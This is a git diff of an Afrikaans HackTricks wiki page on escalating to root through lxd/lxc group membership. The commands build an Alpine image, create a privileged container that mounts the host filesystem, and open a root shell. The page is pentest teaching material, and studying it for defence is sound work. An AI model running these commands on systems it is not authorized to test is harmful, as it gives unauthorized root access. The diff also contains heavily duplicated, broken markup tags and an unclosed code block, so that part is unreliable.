@@ -1,8 +1,8 @@
 # lxd/lxc Groep - Privilege escalasie
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -14,30 +14,8 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
-As jy tot die _**lxd**_ **of** _**lxc**_ **groep** behoort, kan jy root word
+As jy tot die _**lxd**_ **of** _**lxc**_ **groep behoort**, kan jy root word
 
 ## Exploiteer sonder internet
 
@@ -46,20 +24,27 @@ As jy tot die _**lxd**_ **of** _**lxc**_ **groep** behoort, kan jy root word
 Jy kan hierdie distro bouer op jou masjien installeer: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(volg die instruksies van die github):
 ```bash
 sudo su
-#Install requirements
+# Install requirements
 sudo apt update
 sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
-#Clone repo
+
+# Clone repo
 git clone https://github.com/lxc/distrobuilder
-#Make distrobuilder
+
+# Make distrobuilder
 cd distrobuilder
 make
-#Prepare the creation of alpine
+
+# Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
-#Create the container
+
+# Create the container
+## Using build-lxd
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
+## Using build-lxc
+sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
 Upload die lêers **lxd.tar.xz** en **rootfs.squashfs**, voeg die beeld by die repo en skep 'n houer:
 ```bash
@@ -81,7 +66,7 @@ As jy hierdie fout _**Fout: Geen stoorpoel gevind nie. Skep asseblief 'n nuwe st
 Voer **`lxd init`** uit en **herhaal** die vorige stel opdragte
 {% endhint %}
 
-Uiteindelik kan jy die houer uitvoer en root kry:
+Uiteindelik kan jy die houer uitvoer en root verkry:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -109,7 +94,8 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
-{% hint style="success" %}
+<div data-gb-custom-block data-tag="hint" data-style='success'>
+
 Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
@@ -122,52 +108,103 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
-{% endhint %}
+</div>
+
 </details>
-{% endhint %}
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+</details>
+
+</div>
+
+hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</div>
+
+</details>
+
+</div>
+```
+
